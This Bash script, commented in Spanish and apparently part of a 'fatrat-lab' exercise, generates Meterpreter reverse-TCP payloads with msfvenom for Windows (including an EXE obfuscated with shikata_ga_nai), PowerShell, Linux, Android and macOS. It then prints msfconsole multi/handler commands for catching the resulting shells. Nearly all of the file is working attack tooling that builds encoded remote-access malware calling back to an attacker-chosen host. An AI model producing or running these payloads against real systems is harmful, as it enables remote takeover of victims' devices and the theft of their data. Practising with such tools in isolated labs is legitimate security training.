#!/usr/bin/env bash
# =============================================================
# 07 - GENERAR PAYLOAD DE EJEMPLO + INICIAR LISTENER
# Ejecutar:  sudo bash 07-generar-payload-ejemplo.sh <LHOST>
# Ejemplo:   sudo bash 07-generar-payload-ejemplo.sh 192.168.100.10
# =============================================================
set -euo pipefail

LHOST="${1:-}"

# Si no pasaron IP, detectamos automaticamente
if [[ -z "$LHOST" ]]; then
    echo " Detectando IP automaticamente..."
    LHOST=$(ip route get 1 | awk '{print $NF;exit}' 2>/dev/null)
    LHOST=${LHOST:-$(hostname -I | awk '{print $1}')}
    if [[ -z "$LHOST" ]]; then
        echo "No se pudo detectar IP. Usala manualmente:"
        echo "  sudo bash $0 <TU_IP>"
        exit 1
    fi
fi

LPORT=${2:-4444}
OUTDIR="${3:-/output}"
mkdir -p "$OUTDIR"

LOG="/tmp/fatrat-lab/generar-payload.log"
mkdir -p /tmp/fatrat-lab

info()  { echo -e "\033[0;32m[+]\033[0m $*" | tee -a "$LOG"; }
warn()  { echo -e "\033[1;33m[!]\033[0m $*" | tee -a "$LOG"; }

info "======================================"
info "GENERANDO PAYLOADS"
info "LHOST: $LHOST"
info "LPORT: $LPORT"
info "OUTPUT: $OUTDIR"
info "======================================"
echo ""

# ================================
# PAYLOAD 1: Windows EXE
# ================================
info "[1/5] Windows Meterpreter Reverse TCP (EXE)..."
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=$LHOST LPORT=$LPORT \
    -e x86/shikata_ga_nai -i 5 \
    -f exe --platform windows -a x86 \
    -o "$OUTDIR/payload_windows.exe" 2>/dev/null && \
    info "    OK: $OUTDIR/payload_windows.exe" || \
    warn "    Fallo payload Windows"

# ================================
# PAYLOAD 2: Windows PowerShell
# ================================
info "[2/5] Windows PowerShell Reverse TCP..."
msfvenom -p cmd/windows/powershell_reverse_tcp \
    LHOST=$LHOST LPORT=$LPORT \
    -o "$OUTDIR/payload_powershell.ps1" 2>/dev/null && \
    info "    OK: $OUTDIR/payload_powershell.ps1" || \
    warn "    Fallo PowerShell"

# ================================
# PAYLOAD 3: Linux ELF
# ================================
info "[3/5] Linux x64 Meterpreter Reverse TCP (ELF)..."
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$LHOST LPORT=$LPORT \
    -f elf -o "$OUTDIR/payload_linux.elf" 2>/dev/null && \
    info "    OK: $OUTDIR/payload_linux.elf" || \
    warn "    Fallo payload Linux"

# ================================
# PAYLOAD 4: Android APK
# ================================
info "[4/5] Android Meterpreter Reverse TCP (APK)..."
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=$LHOST LPORT=$LPORT \
    -o "$OUTDIR/payload_android.apk" 2>/dev/null && \
    info "    OK: $OUTDIR/payload_android.apk" || \
    warn "    Fallo payload Android (requiere keytool)"

# ================================
# PAYLOAD 5: MacOS Macho
# ================================
info "[5/5] MacOS x64 Meterpreter Reverse TCP (Macho)..."
msfvenom -p osx/x64/meterpreter/reverse_tcp \
    LHOST=$LHOST LPORT=$LPORT \
    -f macho -o "$OUTDIR/payload_macos.macho" 2>/dev/null && \
    info "    OK: $OUTDIR/payload_macos.macho" || \
    warn "    Fallo payload MacOS"

echo ""
info "======================================"
info "PAYLOADS GENERADOS"
info "======================================"
ls -lh "$OUTDIR"/* 2>/dev/null || warn "No se generaron payloads"
echo ""
info "======================================"
info "PARA INICIAR LISTENER:"
info "======================================"
echo ""
echo "  msfconsole -q -x '"
echo "    use multi/handler;"
echo "    set PAYLOAD windows/meterpreter/reverse_tcp;"
echo "    set LHOST 0.0.0.0;"
echo "    set LPORT $LPORT;"
echo "    set ExitOnSession false;"
echo "    exploit -j -z;"
echo "  '"
echo ""
info "O guardalo como script y ejecuta:"
echo "  cat > /tmp/listener.rc << 'EOF'"
echo "  use multi/handler"
echo "  set PAYLOAD windows/meterpreter/reverse_tcp"
echo "  set LHOST 0.0.0.0"
echo "  set LPORT $LPORT"
echo "  set ExitOnSession false"
echo "  exploit -j -z"
echo "  EOF"
echo "  msfconsole -q -r /tmp/listener.rc"
echo ""
info "LOG: $LOG"
